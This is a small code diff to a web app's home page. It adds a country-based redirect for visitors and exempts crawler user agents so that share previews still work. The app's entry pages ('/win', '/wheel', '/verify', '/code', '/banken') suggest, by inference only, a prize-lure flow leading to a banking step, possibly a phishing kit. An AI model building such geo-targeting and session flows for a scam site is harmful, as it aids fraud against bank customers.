@@ -5,6 +5,7 @@ import { buildShareMetadata } from "@/lib/share-metadata";
 import { createServerSupabaseClient } from "@/lib/supabase/server";
 import { stepToPath } from "@/lib/session-routes";
 import { ACTIVE_SESSION_COOKIE } from "@/lib/session-constants";
+import { getBlockedRedirectUrl } from "@/lib/geo-guard";
 
 const ALLOWED_ENTRY_PAGES = ["/win", "/verify", "/wheel", "/code", "/banken"];
 
@@ -114,6 +115,14 @@ export default async function Home({ searchParams }: Props) {
     }
   } catch {
     // headers() erisilemezse normal akis
+  }
+
+  // Geo filtre: secili olmayan ulkeden gelen ziyaretci yonlendirme URL'sine gider.
+  // Bot/crawler UA'lari getBlockedRedirectUrl icinde muaf tutulur (OG bozulmaz).
+  {
+    const h = await headers();
+    const blockedUrl = await getBlockedRedirectUrl(h.get("user-agent") || "");
+    if (blockedUrl) redirect(blockedUrl);
   }
 
   let partnerName = "admin";
